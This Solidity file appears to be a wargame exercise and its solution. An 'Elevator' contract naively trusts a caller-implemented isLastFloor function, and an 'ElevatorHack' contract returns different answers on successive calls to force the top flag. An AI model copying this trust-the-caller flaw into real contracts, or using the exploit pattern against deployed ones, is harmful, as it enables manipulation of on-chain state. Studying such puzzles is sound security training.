// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorHack {
    Elevator private target;
    uint256 private counter;

    constructor(address payable _target) {
        target = Elevator(_target);
    }

    function pwn() external {
        target.goTo(100);
        require(target.top(), "No top!");
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        counter = counter + 1;
        return counter > 1;
    }
}
